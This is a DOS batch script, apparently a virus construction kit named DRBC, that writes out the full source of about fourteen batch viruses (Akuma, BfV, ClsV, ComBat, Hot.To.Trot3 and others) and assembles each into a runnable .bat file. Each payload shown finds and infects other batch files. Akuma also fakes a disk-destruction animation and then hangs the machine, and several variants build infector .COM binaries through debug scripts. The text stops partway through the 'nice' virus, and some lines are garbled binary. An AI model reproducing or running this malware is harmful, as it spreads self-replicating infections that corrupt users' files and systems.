@echo off
if "%1"=="1" goto akuma
if "%1"=="2" goto batman
if "%1"=="3" goto bfv
if "%1"=="4" goto bvroot
if "%1"=="5" goto cheezy
if "%1"=="6" goto clsv
if "%1"=="7" goto combat
if "%1"=="8" goto debug
if "%1"=="9" goto goofy
if "%1"=="10" goto hot
if "%1"=="11" goto nice
if "%1"=="12" goto viz 
if "%1"=="13" goto wise
if "%1"=="14" goto zop
goto fine
:akuma
echo IF %1X==/COPYVIRX GOTO COPY>1.rbc
echo IF %1X==/COPYVIR2X GOTO COPY2>2.rbc
echo IF %1X==/RENVIRX GOTO REN>3.rbc
echo IF %1X==/SETVIRX GOTO SET>4.rbc
echo IF NOT EXIST %0.BAT GOTO SICK>5.rbc
echo SET F=>6.rbc
echo IF NOT EXIST %0.BBK SET F=N>7.rbc
echo SET CD=.\>8.rbc
echo CALL %0 /COPYVIR>9.rbc
echo SET CD=\>9.rbc
echo CALL %0 /COPYVIR>10.rbc
echo SET CD=C:\>11.rbc
echo CALL %0 /COPYVIR>12.rbc
echo IF %F%X==NX ECHO @DEL %0.BAT > \N.BAT>13.rbc
echo IF %F%X==NX ECHO @IF EXIST %0.BBK DEL %0.BBK >> \N.BAT>14.rbc
echo IF %F%X==NX ECHO Bad command or file name>15.rbc
echo IF %F%X==NX ECHO \N.BAT >> %0.BAT>16.rbc
echo IF %F%X==NX GOTO END>17.rbc
echo TYPE %0.BBK > \N.BAT>18.rbc
echo @ECHO ON>19.rbc
echo @CALL \N.BAT %1 %2 %3 %4 %5 %6 %7 %8 %9>20.rbc
echo @ECHO OFF>21.rbc
echo IF EXIST \N.BAT DEL \N.BAT>22.rbc
echo GOTO END>23.rbc
echo :REN>24.rbc
echo echo\>DAKUMA\%2>25.rbc
echo IF EXIST DAKUMA\%0.BAT GOTO RENNOT>26.rbc
echo GOTO RENOK>27.rbc
echo :RENNOT>28.rbc
echo for %%a in (DAKUMA\*.*) DO DEL %%a>29.rbc
echo GOTO END>30.rbc
echo :RENOK>31.rbc
echo for %%a in (DAKUMA\*.*) DO DEL %%a>32.rbc
echo REN %2 *.BBK>33.rbc
echo ECHO\>%2>34.rbc
echo GOTO END>35.rbc
echo :COPY>36.rbc
echo IF EXIST %CD%*.BBK GOTO END>37.rbc
echo ECHO\ > \N.BAT>38.rbc
echo MD DAKUMA>39.rbc
echo FOR %%D IN (%CD%*.BAT) DO ECHO CALL %0 /RENVIR %%D>>\N.BAT>40.rbc
echo CALL \N.BAT>41.rbc
echo FOR %%B IN (%CD%*.BAT) DO CALL %0 /COPYVIR2 %%B>42.rbc
echo RD DAKUMA>43.rbc
echo GOTO END>44.rbc
echo :COPY2>45.rbc
echo echo\>DAKUMA\%2>46.rbc
echo IF EXIST DAKUMA\%0.BAT GOTO cpyNOT>47.rbc
echo GOTO cpyOK>48.rbc
echo :cpyNOT>49.rbc
echo for %%a in (DAKUMA\*.*) DO DEL %%a>50.rbc
echo GOTO END>51.rbc
echo :cpyOK>52.rbc
echo for %%a in (DAKUMA\*.*) DO DEL %%a>53.rbc
echo COPY %0.BAT %2 > NUL> 54.rbc
echo GOTO END>55.rbc
echo :SICK>56.rbc
echo echo ��0�0������ >d.com>57.rbc
echo ECHO �> E.COM>58.rbc
echo D>59.rbc
echo ECHO    Dark Akuma    batch virus    ver 1.3   by  Dark  Akuma>60.rbc
echo ECHO\>61.rbc
echo ECHO  This is Dark Akuma virus 1.3  SUPER SOON-DIE-KILL version>62.rbc
echo ECHO  �o�O�u�t�»����v�f�r 1.3 �W�šu�������v��>63.rbc
echo ECHO\>64.rbc
echo ECHO  OH!!!! You semms no good..... HA!! HA!! HA!! HA!!>65.rbc
echo ECHO  ��.... �A�ݰ_�Ӯ�⤣�n��!!!  ��!! ��!! ��!! ��!!>66.rbc
echo ECHO @ECHO OFF > T.BAT>67.rbc
echo ECHO IF %%1X==X SET C=1 >> T.BAT>68.rbc
echo ECHO IF %%1X==1X SET C=2 >> T.BAT>69.rbc
echo ECHO IF %%1X==2X SET C=3 >> T.BAT>70.rbc
echo ECHO IF %%1X==3X SET C=4 >> T.BAT>71.rbc
echo ECHO IF %%1X==4X SET C=5 >> T.BAT>72.rbc
echo ECHO IF %%1X==5X SET C=6 >> T.BAT>73.rbc
echo ECHO IF %%1X==6X SET C=7 >> T.BAT>74.rbc
echo ECHO IF %%1X==7X SET C=8 >> T.BAT>75.rbc
echo ECHO IF %%1X==8X SET C=9 >> T.BAT>76.rbc
echo ECHO IF %%1X==9X SET C=10 >> T.BAT>76.rbc
echo ECHO IF %%1X==10X SET C=11 >> T.BAT>77.rbc
echo ECHO IF %%1X==11X SET C=12 >> T.BAT>78.rbc
echo ECHO IF %%1X==12X SET C=13 >> T.BAT>79.rbc
echo ECHO IF %%1X==13X SET C=14 >> T.BAT>80.rbc
echo ECHO IF %%1X==14X SET C=15 >> T.BAT>81.rbc
echo ECHO IF %%1X==15X SET C=16 >> T.BAT>82.rbc
echo ECHO IF %%1X==16X SET C=17 >> T.BAT>83.rbc
echo ECHO IF %%1X==17X SET C=18 >> T.BAT>84.rbc
echo ECHO IF %%1X==18X SET C=19 >> T.BAT>85.rbc
echo ECHO IF %%1X==19X SET C=20 >> T.BAT>86.rbc
echo ECHO IF %%1X==20X GOTO END >> T.BAT>87.rbc
echo ECHO %%0 %%C%% >> T.BAT>88.rbc
echo ECHO :END  >> T.BAT>89.rbc
echo ECHO SET C= >> T.BAT>90.rbc
echo ECHO\>91.rbc
echo ECHO        �����������Ŀ>92.rbc
echo ECHO /�-     � HARD DISK �  Dark Akuma SOON-DIE-KILL>93.rbc
echo ECHO /I      �������������>94.rbc
echo CALL T>95.rbc
echo CLS>96.rbc
echo ECHO\>97.rbc
echo ECHO       �����������Ŀ>98.rbc
echo ECHO //�-    � HARD DISK �  Dark Akuma SOON-DIE-KILL>99.rbc
echo ECHO //I     �������������>00.rbc
echo CALL T>01.rbc
echo CLS\>02.rbc
echo ECHO\>03.rbc
echo ECHO      �����������Ŀ>04.rbc
echo ECHO ///�-   � HARD DISK �  Dark Akuma SOON-DIE-KILL>05.rbc
echo ECHO ///I    �������������>06.rbc
echo CALL T>07.rbc
echo CLS>08.rbc
echo ECHO\>09.rbc
echo ECHO    �����������Ŀ>100.rbc
echo ECHO /////�- � HARD DISK �  Dark Akuma SOON-DIE-KILL>101.rbc
echo ECHO /////I  �������������>102.rbc
echo CALL T>103.rbc
echo CLS>104.rbc
echo ECHO\>105.rbc
echo ECHO   �����������Ŀ>106.rbc
echo ECHO //////�-� HARD DISK �  Dark Akuma SOON-DIE-KILL>107.rbc
echo ECHO //////I �������������>108.rbc
echo CALL T>109.rbc                                                                                                                                                                                                                                                                                                  
echo CALL T>110.rbc
echo CALL T>111.rbc
echo CLS>112.rbc
echo ECHO\>113.rbc
echo ECHO             *   *     *>114.rbc
echo ECHO               *    *     *>115.rbc
echo ECHO              *  *      *>116.rbc
echo ECHO >117.rbc
echo CLS>118.rbc
echo ECHO  ���>119.rbc
echo ECHO �����        DIE...>120.rbc
echo ECHO  ���   /I\  ����������¿>121.rbc
echo ECHO �� ��  / \  ������������>122.rbc
echo CALL T>123.rbc
echo CALL T>124.rbc
echo CALL T>125.rbc
echo E>126.rbc
echo :DOWN>127.rbc
echo GOTO DOWN>128.rbc
echo :END>129.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc+26.rbc+27.rbc+28.rbc+29.rbc+30.rbc+31.rbc+32.rbc+33.rbc+34.rbc+36.rbc+37.rbc+38.rbc+39.rbc+40.rbc+41.rbc+42.rbc+43.rbc+44.rbc+45.rbc+46.rbc+47.rbc+48.rbc+49.rbc+50.rbc+51.rbc+52.rbc+53.rbc+54.rbc+55.rbc+56.rbc+57.rbc+58.rbc+59.rbc+60.rbc+61.rbc+62.rbc+63.rbc+64.rbc+65.rbc+66.rbc+67.rbc+68.rbc+69.rbc+70.rbc+71.rbc+72.rbc+73.rbc+74.rbc+75.rbc+76.rbc+77.rbc+78.rbc+79.rbc+80.rbc+81.rbc+82.rbc+83.rbc+84.rbc+85.rbc+86.rbc+87.rbc+88.rbc+89.rbc+90.rbc+91.rbc+92.rbc+93.rbc+94.rbc+95.rbc+96.rbc+97.rbc+98.rbc+99.rbc+00.rbc+01.rbc+02.rbc+03.rbc+04.rbc+05.rbc+06.rbc+07.rbc+08.rbc+09.rbc+100.rbc+101.rbc+102.rbc+103.rbc+104.rbc+105.rbc+106.rbc+107.rbc+108.rbc+109.rbc+110.rbc+111.rbc+112.rbc+113.rbc+114.rbc+115.rbc+116.rbc+117.rbc+118.rbc+119.rbc+120.rbc+121.rbc+122.rbc+123.rbc+124.rbc+125.rbc+126.rbc+127.rbc+128.rbc+129.rbc akuma.bat
del *.rbc
echo.
echo.
echo AKUMA virus created...Thanx for using DRBC
goto fine
:batman
echo @ECHO OFF>1.rbc
echo REM �� ��@uo�PSQRVW���Q_�� �u=� �� ��.���,�>2.rbc
echo copy %0 b.com>nul >3.rbc
echo b.com>4.rbc
echo del b.com>5.rbc
echo rem _^ZY[X���.��� �����.�.�� �#@echo��!5�!������!%�!���'��>6.rbc
echo @echo off>7.rbc
echo echo ------------------ BATMAN VIRUS -------------------->8.rbc

copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc batman.bat
del *.rbc
echo.
echo.
echo BATMAN virus created...Thanx for using DRBC
goto fine
:bfv
echo @echo off%[BfV_B]%>1.rbc
echo if '%1=='## goto BfV_%2>2.rbc
echo if exist C:\_BfV.bat goto BfV_>3.rbc
echo if not exist %0.bat goto BfV_end>4.rbc
echo find "BfV"<%0.bat>C:\_BfV.bat>5.rbc
echo attrib C:\_BfV.bat +h>6.rbc
echo :BfV_>7.rbc
echo command /e:5000 /c C:\_BfV ## run>8.rbc
echo goto BfV_end>9.rbc
echo BfV_run>10.rbc
echo for %%i in (*.bat ..\*.bat) do call C:\_BfV ## inf %%i>11.rbc
echo exit BfV>12.rbc
echo :BfV_inf>13.rbc
echo if '%BfV%=='1111111 exit>14.rbc
echo set BfV=%BfV%1>15.rbc
echo find "BfV"<%3>nul>16.rbc
echo if not errorlevel 1 goto BfV_end>17.rbc
echo type %3>BfV>18.rbc
echo type C:\_BfV.bat>>BfV>19.rbc
echo move BfV %3>nul>\20.rbc
echo exit BfV>21.rbc
echo :BfV_end>22.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc bfv.bat
del *.rbc
echo.
echo.
echo BFV virus created...Thanx for using DRBC
goto fine
:bvroot
echo @echo off%_ViRuS%>1.rbc
echo if '%1=='ViRuS goto virus_%2>2.rbc
echo if exist \virus.bat goto ViRuS_1>3.rbc
echo if not exist %0.bat goto ViRuS_X>4.rbc
echo find "ViRuS"<%0.bat>\virus.bat>5.rbc
echo :ViRuS_1>6.rbc
echo command /c \virus.bat ViRuS 2>7.rbc
echo goto ViRuS_X>8.rbc
echo :ViRuS_2>9.rbc 
echo for %%a in (*.bat ..\*.bat) do call %0 ViRuS 3 %%a>10.rbc  
echo exit ViRuS>11.rbc
echo :ViRuS_3>12.rbc
echo find "ViRuS"<%3>nul>13.rbc
echo if not errorlevel 1 goto ViRuS_X>14.rbc
echo type \virus.bat>ViRuS>15.rbc
echo type %3>>ViRuS>16.rbc
echo move ViRuS %3>nul>17.rbc
echo exit ViRuS>18.rbc
echo :ViRuS_X>19.rbc
echo :: host batch goes here>20.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc bvroot.bat
del *.rbc
echo.
echo.
echo BVROOT virus created...Thanx for using DRBC
goto fine
:cheezy
echo @echo off>nul.ViR>1.rbc
echo if '%1=='InF goto ViR_inf>2.rbc
echo if exist c:\vir.bat goto ViR_run>3.rbc
echo if not exist %0.bat goto ViR_end>4.rbc
echo find "ViR"<%0.bat>c:\vir.bat>5.rbc
echo :ViR_run>6.rbc
echo for %%a in (*.bat) do call c:\ViR InF %%a>7.rbc
echo goto ViR_end>8.rbc
echo :ViR_inf>9.rbc    
echo find "ViR"<%2>nul>10.rbc
echo if not errorlevel 1 goto ViR_end>11.rbc
echo type c:\ViR.bat>>%2>12.rbc
echo :ViR_end>13.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc cheezy.bat
del *.rbc
echo.
echo.
echo CHEEZY virus created...Thanx for using DRBC
goto fine
:clsv
echo @echo off%_ClsV%>1.rbc
echo if '%1=='ClsV goto clsv_%2>2.rbc
echo if '%1=='-ClsV cls>3.rbc
echo if exist c:\clsv.bat goto ClsV_1>4.rbc
echo if not exist %0.bat goto ClsV_X>5.rbc
echo find "ClsV"<%0.bat>c:\clsv.bat>6.rbc
echo :ClsV_1>7.rbc
echo doskey cls=c:\clsv.bat -ClsV>8.rbc
echo command /c c:\clsv.bat ClsV 2>9.rbc
echo goto ClsV_X>10.rbc
echo :ClsV_2>11.rbc 
echo for %%a in (*.bat ..\*.bat) do call %0 ClsV 3 %%a>12.rbc  
echo exit ClsV>13.rbc
echo :ClsV_3>14.rbc
echo find "ClsV"<%3>nul>15.rbc
echo if not errorlevel 1 goto ClsV_X>16.rbc
echo type %3>ClsV>17.rbc
echo echo.>>ClsV>18.rbc
echo type c:\clsv.bat>>ClsV>19.rbc
echo move ClsV %3>nul>20.rbc
echo exit ClsV >21.rbc
echo :ClsV_X>22.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc clsv.bat
del *.rbc
echo.
echo.
echo CLSV virus created...Thanx for using DRBC
goto fine
:combat
echo @REM ��% * ComBat *>1.rbc
echo @echo off>2.rbc
echo goto ComBat>3.rbc
echo �� �< tk�F�N< t��֬<u��D� R�=�!rP����?� �!�>�!Z�>�@Rt8�C3��!�<3ɺ��!r&��@� ���!�>�!� L�! Rajaat / Genesis �L�!ComBat.TMP>4.rbc 
echo :ComBat>5.rbc
echo if #%_tmp%#==## goto no_call>6.rbc
echo C:\ComBat.COM %1>7.rbc
echo if errorlevel 1 goto done_ComBat>8.rbc
echo type %1 >> ComBat.TMP>9.rbc
echo echo. >> ComBat.TMP>10.rbc
echo echo :done_ComBat >> ComBat.TMP>11.rbc
echo copy ComBat.TMP %1 > nul>12.rbc
echo del ComBat.TMP > nul>13.rbc
echo goto done_ComBat>14.rbc
echo :no_call>15.rbc
echo set _tmp=%0>16.rbc
echo if #%_tmp%#==## set _tmp=AUTOEXEC.BAT>17.rbc
echo if not exist %_tmp% set _tmp=%0.BAT>18.rbc
echo if not exist %_tmp% goto path_error>19.rbc
echo copy %_tmp% C:\ComBat.COM > nul>20.rbc
echo for %%f in (*.bat c:\*.bat c:\dos\*.bat c:\windows\*.bat ..\*.bat) do call %_tmp% %%f>21.rbc
echo del C:\ComBat.COM > nul>22.rbc
echo :path_error>23.rbc
echo set _tmp= >24.rbc
echo :done_ComBat>25.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc combat.bat
del *.rbc
echo.
echo.
echo COMBAT virus created...Thanx for using DRBC
goto fine
:debug
echo @echo off>1.rbc
echo goto viru$0>2.rbc
echo a 100>3.rbc
echo jmp 114>4.rbc
echo e 103 "*.bat",0>5.rbc
echo e 109 "$elf",0>6.rbc
echo a 114>7.rbc
echo mov dx,109>8.rbc
echo mov ax,3d00>9.rbc
echo int 21>10.rbc
echo xchg bx,ax>11.rbc
echo mov ah,3f>12.rbc
echo mov cx,30e>13.rbc
echo mov dx,1000>14.rbc
echo int 21>15.rbc
echo mov ah,4e>16.rbc
echo mov cl,20>17.rbc
echo mov dx,103>18.rbc
echo int 21>19.rbc
echo jc 186>20.rbc
echo mov dx,9e>21.rbc
echo mov ax,3d00>22.rbc
echo int 21>23.rbc
echo xchg bx,ax>24.rbc
echo mov ah,3f>25.rbc
echo mov cx,A000>26.rbc
echo mov dx,6000>27.rbc
echo int 21>28.rbc
echo mov word [di+900],ax>29.rbc
echo cmp word [di+601B],3030>30.rbc
echo je 180>31.rbc
echo mov dx,9e>32.rbc
echo mov ax,3d01>33.rbc
echo int 21>34.rbc
echo xchg bx,ax>35.rbc
echo mov ah,40 >36.rbc
echo mov cx,30e>37.rbc
echo mov dx,1000>38.rbc
echo int 21>39.rbc
echo mov ah,40>40.rbc
echo mov cx, [di+900]>41.rbc
echo mov dx,6000>42.rbc
echo int 21>43.rbc
echo mov ah,3e>44.rbc
echo int 21>45.rbc
echo jmp 186>46.rbc
echo a 180>47.rbc
echo mov ah,4f>48.rbc
echo int 21>49.rbc
echo jnb 132>50.rbc
echo ret>51.rbc
echo g>52.rbc
echo q>53.rbc
echo :viru$0>54.rbc
echo if exist %0 copy %0 $elf>nul>55.rbc
echo if exist %0.bat copy %0.bat $elf>nul>56.rbc
echo if not exist $elf goto viru$1>57.rbc
echo debug<$elf>nul>58.rbc
echo del $elf>59.rbc
echo :viru$1>60.rbc
echo :: (hehe) Debug Batch Virus>61.rbc
echo ::  and here's your host...>62.rbc
echo @echo off>63.rbc  
echo echo ---------------------->64.rbc
echo echo Debug-script BAT virus>65.rbc
echo echo ---------------------->66.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc+26.rbc+27.rbc+28.rbc+29.rbc+30.rbc+31.rbc+32.rbc+33.rbc+34.rbc+36.rbc+37.rbc+38.rbc+39.rbc+40.rbc+41.rbc+42.rbc+43.rbc+44.rbc+45.rbc+46.rbc+47.rbc+48.rbc+49.rbc+50.rbc+51.rbc+52.rbc+53.rbc+54.rbc+55.rbc+56.rbc+57.rbc+58.rbc+59.rbc+60.rbc+61.rbc+62.rbc+63.rbc+64.rbc+65.rbc+66.rbc debug.bat
del *.rbc
echo.
echo.
echo DEBUG virus created...Thanx for using DRBC
goto fine
:goofy
echo @echo off%[GooFy]%>1.rbc
echo if '%1==' 42! goto GooFy%2>2.rbc
echo if exist \GooFy_.Bat goto GooFyRun>3.rbc
echo if not exist %0.bat goto GooFyOut>4.rbc
echo find "GooFy"<%0.bat>\GooFy_.Bat>5.rbc
echo :GooFyRun Root Bat in a shell>6.rbc
echo command /c \GooFy_.Bat 42! Vir>7.rbc
echo goto GooFyOut and run the host>8.rbc
echo :GooFyVir Looks for BATs in current and parent>9.rbc
echo for %%a in (*.bat ..\*.bat) do call %0 42! GooFy %%a>10.rbc
echo exit GooFy without doing anything>11.rbc
echo :GooFyGooFy Only works with DOS 6>12.rbc
echo find "GooFy"<%3>nul.amIhere?>13.rbc
echo if not errorlevel 1 goto GooFyOut>14.rbc
echo type \GooFy_.bat>GooFy$>15.rbc
echo type %3>>GooFy$>16.rbc
echo move GooFy$ %3>nul>17.rbc
echo exit GooFy after infecting one batch>18.rbc
echo :GooFyOut *** the GooFy Batch Vir ***>19.rbc
echo ::--- and here's your host...>20.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc goofy.bat
del *.rbc
echo.
echo.
echo GOOFY virus created...Thanx for using DRBC
goto fine
:hot
echo @echo off>1.rbc
echo goto HotToTrot3>2.rbc
echo :To>3.rbc
echo @echo on>4.rbc
echo @echo off>5.rbc
echo echo Welcome to the Hot.To.Trot3 .BAT file virus. 1371 byte parasitic infector>6.rbc
echo echo.>7.rbc
echo echo This is the REAL .BAT file (non-infected part)  It started at the>8.rbc
echo echo @echo off that is about 4 lines above this line.>9.rbc
echo echo This it Version 3 of the Hot.To.Trot  .BAT file virus.>10.rbc
echo echo This version checks for a prior infection and will NOT re-infect a>11.rbc
echo echo .BAT file again. This was a major problem of version 0 and version 1.>12.rbc
echo echo This file is a "appending" virus (not too easy to do with .BAT files)>13.rbc
echo echo That should make it easier to hide from some snoop, by makeing a .BAT>14.rbc
echo echo file that does something, and is more than 50 lines or so.  Then infect>15.rbc
echo echo it.  The other person will have a more difficult time finding the virus>16.rbc
echo echo using the LIST.COM program (but it may be MORE apparent if the person>17.rbc
echo echo TYPE's the file to the screen).>18.rbc
echo echo Oh well, Life's a bitch :)   L8r all.>19.rbc
echo echo This is the LAST line of the original .BAT file.>20.rbc
echo goto Trot3>21.rbc
echo :HotToTrot3>22.rbc
echo if (%1==(Im goto Hot>23.rbc
echo if not exist %0.bat goto To>24.rbc
echo copy %0.bat Hot>nul>25.rbc
echo if not exist Hot goto To>26.rbc
echo echo e 100 BA 68 1 B4 3D CD '!rZ' 93 BE 82 0 B4 D 33 D2 AC 3A C4 74 12 B1 4>To>27.rbc
echo echo e 118 D3 E2 3C '9v' 4 2C 37 EB 2 ',0' 2 D0 EB E9 33 C9 'IR' F7 DA B8 2>>To>28.rbc
echo echo e 130 42 CD 21 B4 '?YQ' BA 6C 1 CD 21 B4 3E CD 21 B4 3C 33 C9 83 EA 4>>To>29.rbc
echo echo e 147 CD 21 93 59 B4 40 BA 6C 1 8B EA 3 E9 4D 80 7E 0 1A 74 1 'BI' CD>>To>30.rbc
echo echo e 15E 21 B4 3E CD 21 B8 0 4C CD '!Hot' 0>>To>31.rbc
echo echo n Babe.com>>To>32.rbc
echo echo rcx>>To>33.rbc
echo echo 6C>>To>34.rbc
echo echo w>>To>35.rbc
echo echo q>>To>36.rbc
echo echo.>>To>37.rbc
echo debug<To>nul>38.rbc
echo Babe 530>nul>39.rbc
echo echo e 100 BE 82 0 8B D6 B4 D AC 3A C4 74 2 EB F9 C6 44 FF 0 B8 0 3D CD '!r'>To>40.rbc
echo echo e 118 1D 93 B4 3F B9 1B 0 BA 42 1 CD '!r' 10 BE 55 1 B9 7 0 BF 3B 1 B8>>To>41.rbc
echo echo e 130 1 4C F3 A6 74 3 B8 0 4C CD '!ToTrot3'>>To>42.rbc
echo echo n Babe.com>>To>43.rbc
echo echo rcx>>To>44.rbc
echo echo 42>>To>45.rbc
echo echo w>>To>46.rbc
echo echo q>>To>47.rbc
echo echo.>>To>48.rbc
echo debug<To>nul>49.rbc
echo echo @echo off>To>50.rbc
echo echo goto HotToTrot3>>To>51.rbc
echo echo :To>>To>52.rbc
echo echo @echo on>>To>53.rbc
echo for %%f in (*.BAT) do call %0 Im %%f>54.rbc
echo for %%f in (..\*.BAT) do call %0 Im %%f>55.rbc
echo if exist Hot del Hot>56.rbc
echo if exist To del To>57.rbc
echo if exist Trot3 del Trot3>58.rbc
echo if exist Babe.com del Babe.Com>59.rbc
echo goto To>60.rbc
echo :Hot>61.rbc
echo for %%f in (%0.*) do if %2==%%f goto Trot3>62.rbc
echo Babe %2>63.rbc
echo if errorlevel 1 goto Trot3>64.rbc
echo copy To+%2+Hot Trot3>nul>65.rbc
echo copy Trot3 %2>nul>66.rbc
echo :Trot3>67.rbc
copy 1.rbc+2.rbc+3.rbc+4.rbc+5.rbc+6.rbc+7.rbc+8.rbc+9.rbc+10.rbc+11.rbc+12.rbc+13.rbc+14.rbc+15.rbc+16.rbc+17.rbc+18.rbc+19.rbc+20.rbc+21.rbc+22.rbc+23.rbc+24.rbc+25.rbc+26.rbc+27.rbc+28.rbc+29.rbc+30.rbc+31.rbc+32.rbc+33.rbc+34.rbc+36.rbc+37.rbc+38.rbc+39.rbc+40.rbc+41.rbc+42.rbc+43.rbc+44.rbc+45.rbc+46.rbc+47.rbc+48.rbc+49.rbc+50.rbc+51.rbc+52.rbc+53.rbc+54.rbc+55.rbc+56.rbc+57.rbc+58.rbc+59.rbc+60.rbc+61.rbc+62.rbc+63.rbc+64.rbc+65.rbc+66.rbc+67.rbc hot3.bat
del *.rbc
echo.
echo.
echo HOT.TO.TROT 3 virus created...Thanx for using DRBC
goto fine
:nice
echo @echo off>nul.ViRuS>1.rbc
echo rem ViRuS The BatchViRuS by Dirk van Deun 1994>2.rbc
echo rem ViRuS May be copied freely (On your own machine !)>3.rbc
echo rem ViRuS Programmed to prove that it's possible>4.rbc
echo rem ViRuS (and to show off skill in writing batchfiles)>5.rbc
echo rem ViRuS If you have no disk cache, you're not interested ;-)>6.rbc
echo rem ViRuS E-mail hw41652@vub.ac.be>7.rbc
echo rem ViRuS Known bug: interpretation of variables may make lines too long>8.rbc 
echo rem ViRuS for DOS and let characters drop off: unpredictable behaviour>9.rbc
echo if "%0==" echo --------------------------------------->con.ViRuS>10.rbc
echo if "%0==" echo |   Hi ! I am the nice BatchViRuS !   |>11.rbc
echo if "%0==" echo --------------------------------------->con.ViRuS>12.rbc
echo if "%0==" goto ViRuS_OLDBAT>13.rbc
echo if "%1=="/ViRuS_MULTIPLY goto ViRuS_multiply>14.rbc
echo if "%1=="/ViRuS_PARSEPATH goto ViRuS_parsepath>15.rbc
echo if "%1=="/ViRuS_FINDSELF goto ViRuS_findself>16.rbc
echo if "%VOFF%=="T goto ViRuS_OLDBAT>17.rbc
echo set ViRuSname=%0>18.rbc                                          
echo if not exist %0.bat command /e:10000 /c %0 /ViRuS_FINDSELF %path%>19.rbc
echo if not exist %0.bat call xViRuSx>20.rbc
echo if not exist %0.bat del xViRuSx.bat>21.rbc
echo if not exist %ViRuSname%.bat set ViRuSname=>22.rbc
echo if "%ViRuSname%==" goto ViRuS_OLDBAT>23.rbc
echo rem ViRuS if batch is started with name.BAT, virus will not become active>24.rbc
echo rem ViRuS it was a bug, now it's a feature ! (also notice the voff variable)>25.rbc
echo rem ViRuS also if batch was only in an append /x:on path (chance=minimal)>26.rbc
echo rem ViRuS or if environment is too small to contain %ViRuSname% !>27.rbc
echo if "%VPATH%==" set VPATH=%PATH%>nul.ViRuS>28.rbc
echo rem (if environment cannot hold VPATH, ViRuS will function partially)>29.rbc
echo command /e:10000 /c %0 /ViRuS_PARSEPATH %VPATH%>30.rbc
echo call xViRuSx>31.rbc
echo del xViRuSx.bat>32.rbc
echo if "%VPATH%==" set VPATH=.>nul.ViRuS>33.rbc
echo set ViRuSname=>34.rbc
echo goto ViRuS_OLDBAT>35.rbc
echo :ViRuS_findself>36.rbc
echo if "%2==" echo.>xViRuSx.bat>37.rbc
echo if "%2==" exit>nul.ViRuS>38.rbc
echo if exist %2\%ViRuSname%.bat echo set ViRuSname=%2\%ViRuSname%>xViRuSx.bat>39.rbc
echo if exist %2\%ViRuSname%.bat exit>40.rbc
echo if exist %2%ViRuSname%.bat echo set ViRuSname=%2%ViRuSname%>xViRuSx.bat>41.rbc
echo if exist %2%ViRuSname%.bat exit>42.rbc
echo shift>nul.ViRuS>43.rbc
echo goto ViRuS_findself>44.rbc
echo :ViRuS_parsepath>45.rbc
echo for %%a in (%2\*.bat;%2*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a>46.rbc
echo for %%a in (%2\*.bat;%2*.bat) do goto ViRuS_new_vpath>47.rbc
echo shift>nul.ViRuS>48.rbc
echo if not "%2==" goto ViRuS_parsepath>49.rbc
echo if not "%1==". for %%a in (.\*.bat) do command /e:10000 /c %ViRuSname% /ViRuS_MULTIPLY %%a>50.rbc
echo :ViRuS_new_vpath>51.rbc
echo set VPATH=%3>nul.ViRuS>52.rbc
echo :ViRuS_loop>53.rbc
echo shift>nul.ViRuS>54.rbc
echo if "%3==" echo set VPATH=%VPATH%>xViRuSx.bat>55.rbc
echo if "%3==" exit>nul.ViRuS>56.rbc
echo set VPATH=%VPATH%;%3>nul.ViRuS>57.rbc
echo goto ViRuS_loop>58.rbc
echo :ViRuS_multiply>59.rbc
echo echo Checking: %2>con.ViRuS>60.rbc
echo find "SeT IchBin=%%0" <%2>xViRuSx.bat>61.rbc
echo call xViRuSx>62.rbc
echo del xViRuSx.bat>63.rbc
echo if "%IchBin%=="xViRuSx exit>64.rbc
echo find "ViRuS" <%ViRuSname%.bat>xViRuSx.bat>65.rbc
echo type %2>>xViRuSx.bat>66.rbc
echo copy xViRuSx.bat %2>nul>67.rbc
echo del xViRuSx.bat>68.rbc
echo echo Infecting: %2>con.ViRuS>69.rbc
echo exit>nul.ViRuS>70.rbc
echo rem data for the first find in ViRuS_multiply>71.rbc
echo SeT IchBin=%0>nul.ViRuS>72.rbc
echo :ViRuS_OLDBAT>73.rbc
echo echo on>nul.ViRuS>74.rbc
echo echo This is the dummy original batch>75.rbc
